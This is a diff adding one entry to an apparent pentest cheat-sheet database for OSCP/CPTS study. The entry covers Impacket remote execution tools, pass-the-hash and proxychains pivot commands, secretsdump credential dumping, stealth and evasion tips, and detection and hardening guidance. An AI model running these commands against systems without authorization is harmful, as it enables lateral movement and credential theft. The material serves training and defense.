@@ -1,0 +1,129 @@
+{
+  "id": "impacket-exec",
+  "name": "Impacket - Remote Command Execution (wmiexec/atexec/smbexec)",
+  "type": "command",
+  "platform": "linux",
+  "command": "impacket-wmiexec <domain>/<user>:<password>@<ip>",
+  "description": "Execute commands / get a semi-interactive shell on Windows over different channels using valid creds or a hash. Pick the method by what's allowed and how stealthy you need to be.",
+  "opsec": "loud",
+  "mitre": [
+    "T1021.002",
+    "T1047"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Remote Execution",
+  "requires": [
+    "credentials"
+  ],
+  "tools": [
+    "impacket-wmiexec",
+    "impacket-atexec",
+    "impacket-smbexec",
+    "impacket-psexec"
+  ],
+  "tags": [
+    "impacket",
+    "lateral-movement",
+    "rce",
+    "wmi",
+    "smb"
+  ],
+  "variations": [
+    {
+      "label": "wmiexec (WMI, no service/binary - quieter)",
+      "command": "impacket-wmiexec <domain>/<user>:<password>@<ip>"
+    },
+    {
+      "label": "wmiexec with hash (PtH)",
+      "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<ip>"
+    },
+    {
+      "label": "smbexec (SMB, semi-interactive, no Python on target)",
+      "command": "impacket-smbexec <domain>/<user>:<password>@<ip>"
+    },
+    {
+      "label": "atexec (Task Scheduler, single command)",
+      "command": "impacket-atexec <domain>/<user>:<password>@<ip> \"whoami\""
+    },
+    {
+      "label": "psexec (drops a service - loudest, SYSTEM)",
+      "command": "impacket-psexec <domain>/<user>:<password>@<ip>"
+    },
+    {
+      "label": "GetUserSPNs via proxychains (pivot)",
+      "command": "proxychains -q impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>"
+    },
+    {
+      "label": "psexec via proxychains PTH (pivot)",
+      "command": "proxychains -q impacket-psexec -hashes :<nt_hash> <user>@<ip>"
+    },
+    {
+      "label": "wmiexec via proxychains (pivot)",
+      "command": "proxychains -q impacket-wmiexec <domain>/<user>:<password>@<ip>"
+    },
+    {
+      "label": "secretsdump via proxychains (pivot)",
+      "command": "proxychains -q impacket-secretsdump <domain>/<user>:<password>@<ip>"
+    }
+  ],
+  "notes": "All need local-admin on the target. Stealth order (quiet->loud): wmiexec ~ atexec (no binary dropped) < smbexec < psexec (creates a service, event 7045). wmiexec/atexec run as the user; psexec gives SYSTEM. All accept -hashes for pass-the-hash. Also covered in: OSCP PEN-200 Chapter 23 (Lateral Movement in Active Directory).",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "Impacket",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "OffSec PEN-200 - Lateral Movement in Active Directory",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "netexec-bruteforce",
+      "rel": "prereq",
+      "note": "Validate which host the creds are local-admin on first."
+    },
+    {
+      "id": "secretsdump-offline",
+      "rel": "next",
+      "note": "Dump more hashes once you land."
+    }
+  ],
+  "examples": [
+    {
+      "label": "WMI exec into a DC with domain creds",
+      "command": "impacket-wmiexec ILF.local/jmarston:'P@ssword!'@10.129.202.85"
+    },
+    {
+      "label": "Ch23 \u2014 wmiexec pass-the-hash with NT hash only (LM part left blank)",
+      "command": "impacket-wmiexec -hashes :<nt_hash> <domain>/<user>@<target_ip>"
+    }
+  ],
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Impacket exec tools (psexec, wmiexec, smbexec, atexec, dcomexec) run commands on a remote Windows host over SMB admin shares, WMI, DCOM, or the task scheduler using valid creds/hash/ticket.",
+    "prerequisites": "Valid credentials (password/hash/ticket) with admin rights on the target and the relevant service (SMB 445 / WMI / DCOM) reachable.",
+    "impact": "Remote command execution as the account - lateral movement to the target.",
+    "detection": "[MITRE T1021.002/T1047] psexec -> service creation (7045/4697) + ADMIN$ writes; wmiexec -> WMI process creation (Sysmon/Security 4688 with wmiprvse parent); 4624 type 3 + 4672; the semi-random output share/file.",
+    "artifacts": "A new service (psexec) or WMI-spawned process; ADMIN$/C$ writes; 4624/4672 logons; command output files.",
+    "prevention": "Restrict lateral admin (LAPS, tiering); block workstation-to-workstation SMB/WMI; monitor service creation (7045) and remote WMI; strong credential hygiene.",
+    "evasion": "wmiexec/atexec avoid the noisy service creation psexec makes; valid admin creds make logons look legitimate; clean up output files.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1021.002"
+    ],
+    "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
+    "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
+    "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+  }
+}
